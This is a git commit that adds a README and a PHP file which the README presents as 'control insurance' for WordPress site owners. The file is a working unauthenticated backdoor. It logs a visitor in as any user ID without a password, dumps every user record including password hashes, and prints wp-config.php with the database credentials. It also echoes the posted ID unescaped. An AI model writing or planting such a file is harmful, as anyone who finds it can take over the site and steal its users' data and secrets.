b8f3a8d0119c5dc2912ab1e06b2d49c3fa1aaa25
alshin <dm.alshin@gmail.com>
2016-02-25 08:28:56 +0300

    Initial commit

--- README.md
+++ README.md
@@ -1,1 +1,14 @@
 # wp-contor-insurance
+
+![version](https://img.shields.io/badge/version-1.0.0-brightgreen.svg?style=flat-square "Version")
+![MIT License](https://img.shields.io/badge/license-MIT-blue.svg?style=flat-square)
+
+## Wordpress site cotrol insurance file
+
+If you are suspecting there is chance to to lose control of your site in future - just put this file in any folder and remember where. Now you can access directly to your file in browser to:
+
+- View list of all user with their parameters
+- Authorize as any of users without password
+- View WordPress configuraton file even if you don't have FTP access
+
+And don't forget to delete file when the threat is gone. Just in case.
---
+++ insurance.php
@@ -0,0 +1,50 @@
+<?php
+require( $_SERVER['DOCUMENT_ROOT'] .'/wp-load.php' );
+
+/**
+ * Optional user authorization
+ */
+
+if ( ! empty($_POST['user']) ) {
+	wp_set_auth_cookie( $_POST['user'] );
+	echo "<p><strong>User with ID ". $_POST['user'] . " authorized</strong></p>";
+}
+?>
+<details>
+	<summary>Authorize you like user with ID:</summary>
+	<form action="" method="post">
+		<p>
+			<input type="text" name="user" size="3" placeholder="ID">
+			<input type="submit" value="Go">
+		</p>
+	</form>
+</details>
+
+
+<?php
+/**
+ * Users list
+ */
+$users = get_users();
+?>
+<details>
+	<summary>Users data:</summary>
+	<pre>
+		<?php print_r($users); ?>
+	</pre>
+</details>
+
+
+<?php
+/**
+ * site configuration input
+ */
+$content = file_get_contents( $_SERVER['DOCUMENT_ROOT'] .'/wp-config.php' );
+$content = str_replace("php", '-->', $content);
+?>
+<details>
+	<summary>Site configuration options:</summary>
+	<pre>
+		<?php echo $content; ?>
+	</pre>
+</details>
